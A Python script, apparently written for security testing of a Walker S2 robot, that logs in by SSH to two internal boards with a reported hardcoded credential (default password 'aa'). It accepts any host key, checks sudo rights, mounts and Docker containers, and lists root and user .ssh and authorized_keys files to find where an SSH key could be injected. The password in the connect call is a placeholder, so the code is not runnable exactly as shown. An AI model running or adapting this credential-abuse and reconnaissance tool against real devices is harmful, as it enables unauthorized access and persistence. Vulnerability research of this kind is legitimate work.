#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · 硬编码凭证 <密码_01> 密码登录探测（双板，只读）

背景: 报告称 board_name=motion 的跨板 SFTP 用硬编码凭证 <密码_01>。
本脚本用同样凭据尝试 ssh 密码登录 vision(192.168.11.3) 与 motion(192.168.11.2)，
并采集: id / sudo -n id / hostname / mount 中 walker|ssh|tmp|etc/walker 行 / docker ps /
        /home/walker/.ssh 与 /root/.ssh 现状（判断 key 注入落点与读写属性）。

用法:
    python ssh_pass_probe.py                # 探测双板
    python ssh_pass_probe.py --host 192.168.11.3    # 只探一块
    python ssh_pass_probe.py --pass aa      # 换密码
"""
import argparse
import sys

import paramiko

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

CMDS = [
    "id; whoami",
    "sudo -n id 2>&1 | head -1",
    "hostname",
    "mount | grep -Ei 'walker|ssh|/tmp|etc/walker'",
    "docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}}' 2>&1",
    "ls -la /home/walker/.ssh/ /root/.ssh/ 2>&1",
    "wc -c /home/walker/.ssh/authorized_keys /root/.ssh/authorized_keys 2>&1",
]


def probe(host, user, password):
    print("=" * 66)
    print(f"[*] {host}  {user}/{password} 密码登录探测")
    print("=" * 66)
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(host, username=user, password=<密码_01>, timeout=10)
        print("[+] 登录成功 ✅\n")
        for cmd in CMDS:
            _, o, e = c.exec_command(cmd, timeout=10)
            out = o.read().decode(errors="replace").rstrip()
            err = e.read().decode(errors="replace").rstrip()
            print(f"$ {cmd}")
            if out:
                print(out)
            if err:
                print(f"[stderr] {err}")
            print()
        c.close()
    except Exception as ex:
        print(f"[!] 登录失败: {ex}")


def main():
    ap = argparse.ArgumentParser(description="<密码_01> 硬编码凭证登录探测（只读）")
    ap.add_argument("--host", default=None, help="只探测该主机")
    ap.add_argument("--user", default="walker")
    ap.add_argument("--pass", dest="password", default="aa")
    args = ap.parse_args()
    targets = [args.host] if args.host else ["192.168.11.3", "192.168.11.2"]
    for h in targets:
        probe(h, args.user, args.password)


if __name__ == "__main__":
    main()
